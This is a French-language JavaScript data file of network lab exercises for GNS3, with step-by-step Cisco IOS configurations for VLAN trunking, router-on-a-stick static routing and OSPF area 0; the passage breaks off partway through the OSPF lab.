// TP & Labs IT — Catégorie : reseau
// 41 TP(s)

const LABS_RESEAU = [
  {
    id: 1,
    titre: "Configuration VLAN et trunk 802.1Q sur GNS3",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 90,
    description: "Mettre en place une segmentation réseau avec deux VLANs (10 et 20) et un port trunk entre deux switches Cisco IOSv dans GNS3. On configure les ports d'accès, le trunk 802.1Q et on vérifie l'isolation complète entre VLANs.",
    objectifs: [
      "Créer et nommer les VLANs 10 (ADMIN) et 20 (PROD) sur deux switches",
      "Configurer les ports d'accès avec le bon VLAN natif",
      "Établir un port trunk 802.1Q entre SW1 et SW2",
      "Vérifier l'isolation des VLANs par des ping tests croisés",
      "Comprendre la propagation des VLANs via le trunking"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+", lien: "https://gns3.com" },
      { type: "vm",       nom: "Cisco IOSv 15.x (image .qcow2)" },
      { type: "logiciel", nom: "GNS3 VM (VMware ou VirtualBox)" },
      { type: "reseau",   nom: "Interface hôte dans le range 192.168.1.0/24" }
    ],
    schema_reseau: `<svg viewBox="0 0 600 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#F59E0B"/>
    </marker>
  </defs>
  <!-- SW1 -->
  <rect x="180" y="110" width="80" height="60" rx="8" fill="#1C1917" stroke="#3B82F6" stroke-width="2"/>
  <text x="220" y="138" text-anchor="middle" fill="#3B82F6" font-size="11" font-weight="bold">SW1</text>
  <text x="220" y="155" text-anchor="middle" fill="#78716C" font-size="9">IOSv</text>
  <!-- SW2 -->
  <rect x="340" y="110" width="80" height="60" rx="8" fill="#1C1917" stroke="#3B82F6" stroke-width="2"/>
  <text x="380" y="138" text-anchor="middle" fill="#3B82F6" font-size="11" font-weight="bold">SW2</text>
  <text x="380" y="155" text-anchor="middle" fill="#78716C" font-size="9">IOSv</text>
  <!-- Trunk -->
  <line x1="260" y1="140" x2="340" y2="140" stroke="#F59E0B" stroke-width="2.5" stroke-dasharray="6,3" marker-end="url(#arrow)"/>
  <line x1="340" y1="140" x2="260" y2="140" stroke="#F59E0B" stroke-width="2.5" stroke-dasharray="6,3" marker-end="url(#arrow)"/>
  <text x="300" y="128" text-anchor="middle" fill="#F59E0B" font-size="9">TRUNK 802.1Q</text>
  <!-- PCs VLAN 10 -->
  <rect x="60" y="50" width="60" height="40" rx="6" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="90" y="67" text-anchor="middle" fill="#A8A29E" font-size="9">PC1</text>
  <text x="90" y="80" text-anchor="middle" fill="#3B82F6" font-size="8">VLAN 10</text>
  <rect x="60" y="190" width="60" height="40" rx="6" fill="#1C1917" stroke="#10B981" stroke-width="1.5"/>
  <text x="90" y="207" text-anchor="middle" fill="#A8A29E" font-size="9">PC2</text>
  <text x="90" y="220" text-anchor="middle" fill="#10B981" font-size="8">VLAN 20</text>
  <!-- PCs VLAN côté SW2 -->
  <rect x="480" y="50" width="60" height="40" rx="6" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="510" y="67" text-anchor="middle" fill="#A8A29E" font-size="9">PC3</text>
  <text x="510" y="80" text-anchor="middle" fill="#3B82F6" font-size="8">VLAN 10</text>
  <rect x="480" y="190" width="60" height="40" rx="6" fill="#1C1917" stroke="#10B981" stroke-width="1.5"/>
  <text x="510" y="207" text-anchor="middle" fill="#A8A29E" font-size="9">PC4</text>
  <text x="510" y="220" text-anchor="middle" fill="#10B981" font-size="8">VLAN 20</text>
  <!-- Liens PC → SW -->
  <line x1="120" y1="70" x2="180" y2="125" stroke="#3B82F6" stroke-width="1.5"/>
  <line x1="120" y1="210" x2="180" y2="155" stroke="#10B981" stroke-width="1.5"/>
  <line x1="480" y1="70" x2="420" y2="125" stroke="#3B82F6" stroke-width="1.5"/>
  <line x1="480" y1="210" x2="420" y2="155" stroke="#10B981" stroke-width="1.5"/>
  <!-- IPs -->
  <text x="90" y="100" text-anchor="middle" fill="#78716C" font-size="8">10.0.10.1/24</text>
  <text x="90" y="240" text-anchor="middle" fill="#78716C" font-size="8">10.0.20.1/24</text>
  <text x="510" y="100" text-anchor="middle" fill="#78716C" font-size="8">10.0.10.2/24</text>
  <text x="510" y="240" text-anchor="middle" fill="#78716C" font-size="8">10.0.20.2/24</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Préparer la topologie GNS3",
        contexte: "Avant toute configuration, on construit la topologie dans GNS3 : deux switches Cisco IOSv reliés entre eux (port trunk futur), et deux PCs de chaque côté (un par VLAN). Les PCs utilisent des VPCS intégrés à GNS3 pour simplifier.",
        commandes: [
          { os: "both", cmd: "# Démarrer tous les équipements dans GNS3\n# Clic droit → Start sur chaque nœud", commentaire: "Démarrage des VMs IOSv (peut prendre 30-60s)" }
        ],
        erreurs_courantes: [
          {
            symptome: "L'image IOSv ne se charge pas dans GNS3",
            cause: "L'image .qcow2 n'est pas correctement importée dans GNS3 ou la GNS3 VM n'est pas démarrée",
            solution: "Aller dans Edit → Preferences → Qemu → Qemu VMs et vérifier le chemin de l'image. S'assurer que GNS3 VM est en état 'running' dans VMware/VirtualBox."
          }
        ]
      },
      {
        titre: "Étape 2 — Créer les VLANs sur SW1",
        contexte: "On se connecte à SW1 via la console GNS3 et on crée les deux VLANs avec un nom explicite. La commande 'vlan database' est la méthode classique sur IOSv, mais on peut aussi le faire en mode config global.",
        commandes: [
          { os: "linux", cmd: "SW1# configure terminal\nSW1(config)# vlan 10\nSW1(config-vlan)# name ADMIN\nSW1(config-vlan)# exit\nSW1(config)# vlan 20\nSW1(config-vlan)# name PROD\nSW1(config-vlan)# exit", commentaire: "Créer VLAN 10 (ADMIN) et VLAN 20 (PROD)" },
          { os: "linux", cmd: "SW1# show vlan brief", commentaire: "Vérifier que les deux VLANs apparaissent avec leur nom" }
        ],
        erreurs_courantes: [
          {
            symptome: "Les VLANs disparaissent après redémarrage",
            cause: "La configuration n'a pas été sauvegardée avec 'write memory'",
            solution: "Toujours terminer par SW1# write memory ou SW1# copy running-config startup-config"
          }
        ]
      },
      {
        titre: "Étape 3 — Assigner les ports d'accès sur SW1",
        contexte: "Les ports reliés aux PCs sont configurés en mode 'access' avec leur VLAN respectif. Un port access n'appartient qu'à un seul VLAN et retire l'en-tête 802.1Q des trames avant de les transmettre.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport access vlan 10\nSW1(config-if)# no shutdown\nSW1(config-if)# exit", commentaire: "Port vers PC1 — VLAN 10 (ADMIN)" },
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/2\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport access vlan 20\nSW1(config-if)# no shutdown\nSW1(config-if)# exit", commentaire: "Port vers PC2 — VLAN 20 (PROD)" },
          { os: "linux", cmd: "SW1# show interfaces GigabitEthernet0/1 switchport", commentaire: "Vérifier la config du port : doit afficher 'Access Mode VLAN: 10'" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Configurer le port trunk entre SW1 et SW2",
        contexte: "Le port trunk transporte les trames de tous les VLANs entre les deux switches. Il ajoute un tag 802.1Q (4 octets) dans l'en-tête Ethernet pour identifier le VLAN d'appartenance. On active l'encapsulation dot1q avant de passer en mode trunk.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/3\nSW1(config-if)# switchport trunk encapsulation dot1q\nSW1(config-if)# switchport mode trunk\nSW1(config-if)# switchport trunk allowed vlan 10,20\nSW1(config-if)# no shutdown\nSW1(config-if)# exit", commentaire: "Trunk 802.1Q — autorise VLAN 10 et 20 uniquement" },
          { os: "linux", cmd: "# Répéter la même config sur SW2 (interface GigabitEthernet0/3)", commentaire: "Le trunk doit être configuré des deux côtés" },
          { os: "linux", cmd: "SW1# show interfaces trunk", commentaire: "Vérifier : port en mode 'trunk', VLANs 10,20 dans 'VLANs allowed and active'" }
        ],
        erreurs_courantes: [
          {
            symptome: "Le port trunk affiche 'not trunking' dans show interfaces trunk",
            cause: "L'encapsulation n'est pas négociée (DTP peut échouer si un côté est en mode access)",
            solution: "Forcer le mode trunk des deux côtés avec 'switchport mode trunk' sans laisser DTP négocier. Vérifier aussi que 'switchport trunk encapsulation dot1q' est appliqué avant 'switchport mode trunk'."
          }
        ]
      },
      {
        titre: "Étape 5 — Configurer les IPs des PCs et tester",
        contexte: "On assigne des adresses IP aux VPCS GNS3 et on effectue des ping tests pour valider l'isolation entre VLANs et la connectivité au sein d'un même VLAN à travers le trunk.",
        commandes: [
          { os: "linux", cmd: "# Sur PC1 (VPCS GNS3)\nPC1> ip 10.0.10.1 255.255.255.0\nPC1> ping 10.0.10.2", commentaire: "PC1 → PC3 (même VLAN 10, doit répondre ✓)" },
          { os: "linux", cmd: "PC1> ping 10.0.20.1", commentaire: "PC1 → PC2 (VLAN différent, doit échouer ✗ — isolation OK)" },
          { os: "linux", cmd: "SW1# show mac address-table", commentaire: "Observer la table MAC et les VLANs associés à chaque entrée" }
        ],
        erreurs_courantes: [
          {
            symptome: "Le ping entre PCs du même VLAN échoue",
            cause: "L'interface du port trunk sur SW2 n'est pas configurée ou le VLAN n'est pas dans la liste allowed",
            solution: "Vérifier 'show interfaces trunk' sur les deux switches. S'assurer que les VLANs 10 et 20 apparaissent dans la colonne 'VLANs allowed and active in management domain'."
          }
        ]
      }
    ],
    checklist: [
      "Les VLAN 10 (ADMIN) et 20 (PROD) apparaissent dans 'show vlan brief' sur les deux switches",
      "Les ports access sont correctement assignés (vérifiable via 'show interfaces switchport')",
      "Le port trunk est actif et porte les VLANs 10 et 20 ('show interfaces trunk')",
      "PC1 ↔ PC3 (VLAN 10) : ping fonctionnel à travers le trunk",
      "PC1 → PC2 (VLAN 10 → 20) : ping échoue — isolation confirmée"
    ],
    tags: ["vlan", "gns3", "cisco", "trunk", "802.1q", "iosv", "reseau"],
    date_ajout: "2026-01-15",
    source: "École"
  },

  {
    id: 4,
    titre: "Routage statique et Router-on-a-Stick sur GNS3",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 90,
    description: "Configurer le routage statique entre trois réseaux distincts, puis mettre en place un Router-on-a-Stick pour permettre la communication inter-VLAN via une seule interface physique du routeur découpée en sous-interfaces 802.1Q.",
    objectifs: [
      "Comprendre et configurer des routes statiques IPv4 sur IOS",
      "Maîtriser la notion de route par défaut (default route)",
      "Créer des sous-interfaces (subinterfaces) 802.1Q sur un routeur Cisco",
      "Permettre la communication entre VLAN 10 et VLAN 20 via le routeur",
      "Vérifier le routage avec show ip route et des ping tests croisés"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+", lien: "https://gns3.com" },
      { type: "vm",       nom: "Cisco IOSv 15.x (routeur)" },
      { type: "vm",       nom: "Cisco IOSv-L2 (switch)" },
      { type: "reseau",   nom: "Notions de base en adressage IPv4 et masques CIDR" }
    ],
    schema_reseau: `<svg viewBox="0 0 640 300" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <defs>
    <marker id="arr2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#F59E0B"/>
    </marker>
  </defs>
  <!-- Routeur R1 -->
  <ellipse cx="320" cy="140" rx="44" ry="30" fill="#1C1917" stroke="#F59E0B" stroke-width="2"/>
  <text x="320" y="136" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">R1</text>
  <text x="320" y="151" text-anchor="middle" fill="#78716C" font-size="8">IOSv</text>
  <!-- Switch SW1 -->
  <rect x="220" y="220" width="70" height="45" rx="6" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="255" y="240" text-anchor="middle" fill="#3B82F6" font-size="10" font-weight="bold">SW1</text>
  <text x="255" y="256" text-anchor="middle" fill="#78716C" font-size="8">IOSv-L2</text>
  <!-- PC VLAN 10 -->
  <rect x="60" y="220" width="60" height="40" rx="6" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="90" y="237" text-anchor="middle" fill="#A8A29E" font-size="9">PC1</text>
  <text x="90" y="250" text-anchor="middle" fill="#3B82F6" font-size="8">VLAN 10</text>
  <text x="90" y="275" text-anchor="middle" fill="#78716C" font-size="7">10.0.10.10/24</text>
  <!-- PC VLAN 20 -->
  <rect x="360" y="220" width="60" height="40" rx="6" fill="#1C1917" stroke="#10B981" stroke-width="1.5"/>
  <text x="390" y="237" text-anchor="middle" fill="#A8A29E" font-size="9">PC2</text>
  <text x="390" y="250" text-anchor="middle" fill="#10B981" font-size="8">VLAN 20</text>
  <text x="390" y="275" text-anchor="middle" fill="#78716C" font-size="7">10.0.20.10/24</text>
  <!-- Réseau externe -->
  <rect x="490" y="115" width="80" height="50" rx="6" fill="#1C1917" stroke="#8B5CF6" stroke-width="1.5"/>
  <text x="530" y="137" text-anchor="middle" fill="#8B5CF6" font-size="9">Réseau</text>
  <text x="530" y="150" text-anchor="middle" fill="#8B5CF6" font-size="9">externe</text>
  <text x="530" y="162" text-anchor="middle" fill="#78716C" font-size="7">192.168.100.0/24</text>
  <!-- Liens -->
  <line x1="276" y1="148" x2="255" y2="220" stroke="#F59E0B" stroke-width="2" marker-end="url(#arr2)"/>
  <text x="248" y="188" text-anchor="middle" fill="#F59E0B" font-size="8">Gi0/0</text>
  <text x="248" y="198" text-anchor="middle" fill="#78716C" font-size="7">.1Q trunk</text>
  <line x1="120" y1="240" x2="220" y2="240" stroke="#3B82F6" stroke-width="1.5"/>
  <line x1="310" y1="240" x2="360" y2="240" stroke="#10B981" stroke-width="1.5"/>
  <line x1="364" y1="140" x2="490" y2="140" stroke="#8B5CF6" stroke-width="1.5" marker-end="url(#arr2)"/>
  <text x="428" y="132" text-anchor="middle" fill="#8B5CF6" font-size="8">Gi0/1</text>
  <!-- Subinterfaces label -->
  <text x="180" y="118" text-anchor="middle" fill="#F59E0B" font-size="8">Gi0/0.10 → 10.0.10.1/24</text>
  <text x="180" y="130" text-anchor="middle" fill="#10B981" font-size="8">Gi0/0.20 → 10.0.20.1/24</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Planifier l'adressage et construire la topologie",
        contexte: "Avant de toucher à la CLI, on planifie l'adressage. Le routeur R1 aura deux sous-interfaces sur Gi0/0 (une par VLAN) et une interface Gi0/1 vers le réseau externe. Le switch SW1 est configuré avec un trunk vers R1 et des ports access pour les PCs.",
        commandes: [
          { os: "both", cmd: "# Plan d'adressage :\n# VLAN 10 (ADMIN) : 10.0.10.0/24  — Gateway : 10.0.10.1  (R1 Gi0/0.10)\n# VLAN 20 (PROD)  : 10.0.20.0/24  — Gateway : 10.0.20.1  (R1 Gi0/0.20)\n# Réseau ext.     : 192.168.100.0/24 — R1 Gi0/1 : 192.168.100.1\n# PC1 : 10.0.10.10/24 gw 10.0.10.1\n# PC2 : 10.0.20.10/24 gw 10.0.20.1", commentaire: "Tableau d'adressage — à garder sous la main pendant tout le TP" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Configurer le switch SW1 (trunk + access)",
        contexte: "Le switch doit créer les VLANs, configurer le port vers R1 en trunk et les ports vers les PCs en mode access. C'est la même logique que le TP VLAN précédent.",
        commandes: [
          { os: "linux", cmd: "SW1(config)# vlan 10\nSW1(config-vlan)# name ADMIN\nSW1(config-vlan)# exit\nSW1(config)# vlan 20\nSW1(config-vlan)# name PROD\nSW1(config-vlan)# exit", commentaire: "Créer les VLANs 10 et 20" },
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/1\nSW1(config-if)# switchport trunk encapsulation dot1q\nSW1(config-if)# switchport mode trunk\nSW1(config-if)# switchport trunk allowed vlan 10,20\nSW1(config-if)# no shutdown", commentaire: "Port trunk vers R1 — transporte les deux VLANs" },
          { os: "linux", cmd: "SW1(config)# interface GigabitEthernet0/2\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport access vlan 10\nSW1(config-if)# no shutdown\nSW1(config)# interface GigabitEthernet0/3\nSW1(config-if)# switchport mode access\nSW1(config-if)# switchport access vlan 20\nSW1(config-if)# no shutdown", commentaire: "Ports access : Gi0/2 → VLAN 10, Gi0/3 → VLAN 20" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Configurer les sous-interfaces Router-on-a-Stick sur R1",
        contexte: "Le principe du Router-on-a-Stick : une seule interface physique Gi0/0 est découpée en sous-interfaces logiques, chacune associée à un VLAN via l'encapsulation dot1q. L'interface physique elle-même n'a pas d'IP — ce sont les sous-interfaces qui en ont une.",
        commandes: [
          { os: "linux", cmd: "R1(config)# interface GigabitEthernet0/0\nR1(config-if)# no shutdown\nR1(config-if)# exit", commentaire: "Activer l'interface physique SANS IP — juste no shutdown" },
          { os: "linux", cmd: "R1(config)# interface GigabitEthernet0/0.10\nR1(config-subif)# encapsulation dot1Q 10\nR1(config-subif)# ip address 10.0.10.1 255.255.255.0\nR1(config-subif)# no shutdown\nR1(config-subif)# exit", commentaire: "Sous-interface VLAN 10 — gateway des PCs du VLAN 10" },
          { os: "linux", cmd: "R1(config)# interface GigabitEthernet0/0.20\nR1(config-subif)# encapsulation dot1Q 20\nR1(config-subif)# ip address 10.0.20.1 255.255.255.0\nR1(config-subif)# no shutdown\nR1(config-subif)# exit", commentaire: "Sous-interface VLAN 20 — gateway des PCs du VLAN 20" },
          { os: "linux", cmd: "R1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip address 192.168.100.1 255.255.255.0\nR1(config-if)# no shutdown", commentaire: "Interface vers réseau externe" },
          { os: "linux", cmd: "R1# show ip interface brief", commentaire: "Vérifier que toutes les interfaces sont 'up/up' et ont leurs IPs" }
        ],
        erreurs_courantes: [
          {
            symptome: "Les sous-interfaces sont en 'down/down' même après no shutdown",
            cause: "L'interface physique parente (Gi0/0) n'est pas activée avec no shutdown",
            solution: "Aller sur R1(config)# interface GigabitEthernet0/0 et taper no shutdown. Les sous-interfaces héritent de l'état de l'interface physique."
          },
          {
            symptome: "Erreur 'encapsulation command not available'",
            cause: "La commande encapsulation dot1Q doit être tapée sur la sous-interface, pas sur l'interface physique",
            solution: "Vérifier que tu es bien dans R1(config-subif)# (sous-interface) et pas dans R1(config-if)# (interface physique)."
          }
        ]
      },
      {
        titre: "Étape 4 — Configurer le routage statique",
        contexte: "Les routes connectées (directly connected) sont automatiquement dans la table de routage. On ajoute des routes statiques pour des réseaux distants non directement connectés, et une route par défaut (0.0.0.0/0) pour le trafic vers Internet.",
        commandes: [
          { os: "linux", cmd: "R1# show ip route", commentaire: "Observer les routes 'C' (connected) déjà présentes pour les 3 réseaux" },
          { os: "linux", cmd: "# Exemple : ajouter une route statique vers un réseau distant\n# (si un deuxième routeur R2 est présent avec le réseau 172.16.0.0/24)\nR1(config)# ip route 172.16.0.0 255.255.255.0 192.168.100.2", commentaire: "Route statique : pour atteindre 172.16.0.0/24, passer par 192.168.100.2 (next-hop)" },
          { os: "linux", cmd: "R1(config)# ip route 0.0.0.0 0.0.0.0 192.168.100.254", commentaire: "Route par défaut — tout trafic sans route connue passe par 192.168.100.254" },
          { os: "linux", cmd: "R1# show ip route static", commentaire: "Afficher uniquement les routes statiques (marquées 'S' dans la table)" }
        ],
        erreurs_courantes: [
          {
            symptome: "La route statique n'apparaît pas dans 'show ip route'",
            cause: "L'interface next-hop n'est pas active (down), la route n'est donc pas installée",
            solution: "Vérifier l'état de l'interface vers le next-hop avec 'show ip interface brief'. Si elle est down, faire no shutdown."
          }
        ]
      },
      {
        titre: "Étape 5 — Configurer les PCs et tester le routage inter-VLAN",
        contexte: "On assigne les IPs aux VPCS et on teste la connectivité. Le test clé est le ping entre PC1 (VLAN 10) et PC2 (VLAN 20) — le trafic doit monter jusqu'à R1 via le trunk, être routé, puis redescendre vers le VLAN de destination.",
        commandes: [
          { os: "linux", cmd: "# Sur PC1 (VPCS) :\nPC1> ip 10.0.10.10 255.255.255.0 10.0.10.1\nPC1> ping 10.0.10.1", commentaire: "Test gateway VLAN 10 — doit répondre (même VLAN, accès direct)" },
          { os: "linux", cmd: "PC1> ping 10.0.20.10", commentaire: "Test inter-VLAN PC1 → PC2 — doit répondre via R1 ✓" },
          { os: "linux", cmd: "PC1> ping 192.168.100.1", commentaire: "Test vers réseau externe — doit répondre via routage ✓" },
          { os: "linux", cmd: "R1# show ip route\nR1# show arp", commentaire: "Vérifier la table de routage et les entrées ARP des gateways" },
          { os: "linux", cmd: "R1# debug ip packet\n# (désactiver après test : undebug all)", commentaire: "Observer le routage paquet par paquet — attention verbeux" }
        ],
        erreurs_courantes: [
          {
            symptome: "Ping inter-VLAN échoue (PC1 → PC2)",
            cause: "Les PCs n'ont pas de gateway configurée, ou la gateway pointe vers la mauvaise IP",
            solution: "Vérifier sur chaque VPCS avec 'show ip'. La gateway de PC1 doit être 10.0.10.1, celle de PC2 doit être 10.0.20.1 — l'IP de la sous-interface correspondante sur R1."
          }
        ]
      }
    ],
    checklist: [
      "show ip interface brief sur R1 : Gi0/0.10, Gi0/0.20 et Gi0/1 sont 'up/up' avec leurs IPs",
      "show vlan brief sur SW1 : VLAN 10 et 20 existent avec les bons ports",
      "show interfaces trunk sur SW1 : port trunk actif vers R1 avec VLAN 10,20",
      "Ping PC1 → gateway 10.0.10.1 : OK",
      "Ping PC1 → PC2 (inter-VLAN 10.0.20.10) : OK via R1",
      "show ip route sur R1 : routes C et S visibles correctement"
    ],
    tags: ["routage", "statique", "router-on-a-stick", "subinterface", "inter-vlan", "cisco", "gns3", "dot1q"],
    date_ajout: "2026-02-01",
    source: "École"
  },

  {
    id: 5,
    titre: "OSPF mono-zone (Area 0) entre 3 routeurs Cisco",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 100,
    description: "Mettre en place un routage dynamique OSPF en area 0 sur une topologie de 3 routeurs interconnectés. On configure les annonces réseau, observe l'élection DR/BDR, analyse les LSA échangés et vérifie la convergence automatique en cas de panne.",
    objectifs: [
      "Activer OSPF sur chaque routeur avec un process-id et un router-id unique",
      "Annoncer les réseaux locaux via la commande network avec wildcard mask",
      "Observer l'élection DR/BDR sur un segment multi-accès",
      "Analyser la table OSPF et la table de routage résultante",
      "Simuler une panne de lien et observer la reconvergence OSPF"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+", lien: "https://gns3.com" },
      { type: "vm",       nom: "3x Cisco IOSv 15.x" },
      { type: "reseau",   nom: "Maîtrise du routage statique (TP précédent recommandé)" },
      { type: "reseau",   nom: "Comprendre les wildcard masks (inverse du masque subnet)" }
    ],
    schema_reseau: `<svg viewBox="0 0 620 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;font-family:'JetBrains Mono',monospace">
  <defs>
    <marker id="arr3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#F59E0B"/>
    </marker>
  </defs>
  <!-- R1 -->
  <ellipse cx="160" cy="140" rx="44" ry="30" fill="#1C1917" stroke="#F59E0B" stroke-width="2"/>
  <text x="160" y="136" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">R1</text>
  <text x="160" y="151" text-anchor="middle" fill="#78716C" font-size="8">RID 1.1.1.1</text>
  <!-- R2 -->
  <ellipse cx="380" cy="60" rx="44" ry="30" fill="#1C1917" stroke="#F59E0B" stroke-width="2"/>
  <text x="380" y="56" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">R2</text>
  <text x="380" y="71" text-anchor="middle" fill="#78716C" font-size="8">RID 2.2.2.2</text>
  <!-- R3 -->
  <ellipse cx="380" cy="220" rx="44" ry="30" fill="#1C1917" stroke="#F59E0B" stroke-width="2"/>
  <text x="380" y="216" text-anchor="middle" fill="#F59E0B" font-size="11" font-weight="bold">R3</text>
  <text x="380" y="231" text-anchor="middle" fill="#78716C" font-size="8">RID 3.3.3.3</text>
  <!-- Liens inter-routeurs -->
  <line x1="204" y1="122" x2="336" y2="72" stroke="#F59E0B" stroke-width="2"/>
  <text x="255" y="85" text-anchor="middle" fill="#A8A29E" font-size="8">10.0.12.0/30</text>
  <line x1="204" y1="158" x2="336" y2="208" stroke="#F59E0B" stroke-width="2"/>
  <text x="255" y="200" text-anchor="middle" fill="#A8A29E" font-size="8">10.0.13.0/30</text>
  <line x1="380" y1="90" x2="380" y2="190" stroke="#F59E0B" stroke-width="2"/>
  <text x="415" y="145" text-anchor="middle" fill="#A8A29E" font-size="8">10.0.23.0/30</text>
  <!-- Réseaux LAN -->
  <rect x="30" y="115" width="60" height="35" rx="5" fill="#1C1917" stroke="#3B82F6" stroke-width="1.5"/>
  <text x="60" y="130" text-anchor="middle" fill="#3B82F6" font-size="8">LAN R1</text>
  <text x="60" y="142" text-anchor="middle" fill="#78716C" font-size="7">192.168.1.0/24</text>
  <line x1="116" y1="140" x2="90" y2="132" stroke="#3B82F6" stroke-width="1.5"/>
  <rect x="455" y="35" width="60" height="35" rx="5" fill="#1C1917" stroke="#10B981" stroke-width="1.5"/>
  <text x="485" y="50" text-anchor="middle" fill="#10B981" font-size="8">LAN R2</text>
  <text x="485" y="62" text-anchor="middle" fill="#78716C" font-size="7">192.168.2.0/24</text>
  <line x1="424" y1="60" x2="455" y2="52" stroke="#10B981" stroke-width="1.5"/>
  <rect x="455" y="195" width="60" height="35" rx="5" fill="#1C1917" stroke="#8B5CF6" stroke-width="1.5"/>
  <text x="485" y="210" text-anchor="middle" fill="#8B5CF6" font-size="8">LAN R3</text>
  <text x="485" y="222" text-anchor="middle" fill="#78716C" font-size="7">192.168.3.0/24</text>
  <line x1="424" y1="220" x2="455" y2="212" stroke="#8B5CF6" stroke-width="1.5"/>
  <!-- OSPF Area label -->
  <rect x="150" y="10" width="130" height="24" rx="4" fill="rgba(245,158,11,0.1)" stroke="rgba(245,158,11,0.3)" stroke-width="1"/>
  <text x="215" y="26" text-anchor="middle" fill="#F59E0B" font-size="9" font-weight="bold">OSPF Area 0 (Backbone)</text>
</svg>`,
    etapes: [
      {
        titre: "Étape 1 — Configurer les interfaces et l'adressage IP",
        contexte: "On commence par assigner les IPs sur toutes les interfaces avant d'activer OSPF. Les liens inter-routeurs utilisent des /30 (2 hôtes utiles) pour économiser les adresses. Chaque routeur a aussi une interface loopback qui servira de Router-ID stable.",
        commandes: [
          { os: "linux", cmd: "! ── R1 ──\nR1(config)# interface Loopback0\nR1(config-if)# ip address 1.1.1.1 255.255.255.255\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip address 10.0.12.1 255.255.255.252\nR1(config-if)# no shutdown\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip address 10.0.13.1 255.255.255.252\nR1(config-if)# no shutdown\nR1(config)# interface GigabitEthernet0/2\nR1(config-if)# ip address 192.168.1.1 255.255.255.0\nR1(config-if)# no shutdown", commentaire: "Configuration IP complète de R1 (loopback + 3 interfaces)" },
          { os: "linux", cmd: "! ── R2 ──\nR2(config)# interface Loopback0\nR2(config-if)# ip address 2.2.2.2 255.255.255.255\nR2(config)# interface GigabitEthernet0/0\nR2(config-if)# ip address 10.0.12.2 255.255.255.252\nR2(config-if)# no shutdown\nR2(config)# interface GigabitEthernet0/1\nR2(config-if)# ip address 10.0.23.1 255.255.255.252\nR2(config-if)# no shutdown\nR2(config)# interface GigabitEthernet0/2\nR2(config-if)# ip address 192.168.2.1 255.255.255.0\nR2(config-if)# no shutdown", commentaire: "Configuration IP de R2" },
          { os: "linux", cmd: "! ── R3 ──\nR3(config)# interface Loopback0\nR3(config-if)# ip address 3.3.3.3 255.255.255.255\nR3(config)# interface GigabitEthernet0/0\nR3(config-if)# ip address 10.0.13.2 255.255.255.252\nR3(config-if)# no shutdown\nR3(config)# interface GigabitEthernet0/1\nR3(config-if)# ip address 10.0.23.2 255.255.255.252\nR3(config-if)# no shutdown\nR3(config)# interface GigabitEthernet0/2\nR3(config-if)# ip address 192.168.3.1 255.255.255.0\nR3(config-if)# no shutdown", commentaire: "Configuration IP de R3" }
        ],
        erreurs_courantes: [
          {
            symptome: "Ping entre routeurs voisins échoue même après configuration des IPs",
            cause: "Une ou plusieurs interfaces sont en 'administratively down' (shutdown par défaut sur IOSv)",
            solution: "Vérifier 'show ip interface brief' — toutes les interfaces doivent être 'up/up'. Faire no shutdown sur chacune si nécessaire."
          }
        ]
      },
      {
        titre: "Étape 2 — Activer OSPF sur les trois routeurs",
        contexte: "On active OSPF avec le process-id 1 (local au routeur, pas partagé) et on définit un router-id explicite via la loopback. La commande network annonce les réseaux à inclure dans OSPF — le wildcard mask est l'inverse du masque subnet (/30 → wildcard 0.0.0.3).",
        commandes: [
          { os: "linux", cmd: "R1(config)# router ospf 1\nR1(config-router)# router-id 1.1.1.1\nR1(config-router)# network 10.0.12.0 0.0.0.3 area 0\nR1(config-router)# network 10.0.13.0 0.0.0.3 area 0\nR1(config-router)# network 192.168.1.0 0.0.0.255 area 0\nR1(config-router)# passive-interface GigabitEthernet0/2", commentaire: "OSPF sur R1 — passive-interface sur le LAN (pas de voisin OSPF côté PCs)" },
          { os: "linux", cmd: "R2(config)# router ospf 1\nR2(config-router)# router-id 2.2.2.2\nR2(config-router)# network 10.0.12.0 0.0.0.3 area 0\nR2(config-router)# network 10.0.23.0 0.0.0.3 area 0\nR2(config-router)# network 192.168.2.0 0.0.0.255 area 0\nR2(config-router)# passive-interface GigabitEthernet0/2", commentaire: "OSPF sur R2" },
